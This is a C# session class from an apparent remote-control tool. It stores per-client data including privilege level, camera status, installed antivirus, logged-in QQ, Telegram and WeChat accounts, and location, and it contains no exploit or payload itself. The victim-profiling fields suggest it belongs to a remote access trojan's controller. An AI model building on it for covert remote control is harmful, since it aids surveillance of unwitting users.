using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Net;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Codec;

namespace RemoteControl.Protocals
{
    public class SocketSession
    {
        public Socket SocketObj { get; private set; }
        public string SocketId { get; private set; }
        public string HostName { get; private set; }
        public string AppPath { get; private set; }
        public string OnlineAvatar { get; private set; }
        public string ExternalIP { get; private set; }
        public string UserName { get; private set; }
        public string LocalIP { get; private set; }
        public string OSVersion { get; private set; }
        public string Privilege { get; private set; }
        public string CameraStatus { get; private set; }
        public string Antivirus { get; private set; }
        public string OnlineQQ { get; private set; }
        public string TG { get; private set; }
        public string WX { get; private set; }
        public string UserStatus { get; private set; }
        public string Region { get; private set; }
        public string ISP { get; private set; }
        public string Location { get; private set; }
        public string Remark { get; private set; }
        public DateTime LastActiveTime { get; private set; }

        public SocketSession(string sId, Socket oSocket)
        {
            this.SocketId = sId;
            this.SocketObj = oSocket;
            this.LastActiveTime = DateTime.Now;
        }

        public SocketSession(EndPoint sId, Socket oSocket) : this((sId as IPEndPoint).ToString(), oSocket)
        {
            
        }

        /// <summary>
        /// 关闭会话
        /// </summary>
        public void Close()
        {
            try
            {
                if (SocketObj != null)
                {
                    SocketObj.Close();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        /// <summary>
        /// 设置主机名
        /// </summary>
        /// <param name="hostName"></param>
        public void SetHostName(string hostName)
        {
            this.HostName = hostName;
        }

        public void SetAppPath(string appPath)
        {
            this.AppPath = appPath;
        }

        public void SetOnlineAvatar(string avatar)
        {
            this.OnlineAvatar = avatar;
        }

        public void SetExternalIP(string externalIP)
        {
            this.ExternalIP = ExtractIP(externalIP);
        }

        public void SetClientInfo(string userName, string localIP, string osVersion, string privilege, string cameraStatus)
        {
            this.UserName = userName;
            this.LocalIP = localIP;
            this.OSVersion = osVersion;
            this.Privilege = privilege;
            this.CameraStatus = cameraStatus;
        }

        public void SetBossExInfo(string antivirus, string onlineQQ, string tg, string wx, string userStatus, string region, string isp)
        {
            this.Antivirus = antivirus;
            this.OnlineQQ = onlineQQ;
            this.TG = tg;
            this.WX = wx;
            this.UserStatus = userStatus;
            this.Region = region;
            this.ISP = isp;
        }

        public void SetLocation(string location)
        {
            this.Location = location;
        }

        public void SetRemark(string remark)
        {
            this.Remark = remark;
        }

        public void Touch()
        {
            this.LastActiveTime = DateTime.Now;
        }

        public string GetSocketIPById()
        {
            if(SocketId==null)
                return string.Empty;
            string[] array = SocketId.Split(':');
            if (array.Length != 2)
                return string.Empty;
            return array[0];
        }

        public string GetExternalIP()
        {
            if (!string.IsNullOrEmpty(ExternalIP))
                return ExternalIP;
            return GetSocketIPById();
        }

        private static string ExtractIP(string endpoint)
        {
            if (string.IsNullOrEmpty(endpoint))
                return string.Empty;
            string[] parts = endpoint.Split(':');
            if (parts.Length >= 2)
                return parts[0];
            return endpoint;
        }

        public void Send(ePacketType packetType, object obj)
        {
            try
            {
                this.SocketObj.Send(CodecFactory.Instance.EncodeOject(packetType, obj));
            }
            catch (Exception ex)
            {
                Console.WriteLine("SocketSession Error:" + ex.Message);
            }
        }
    }
}
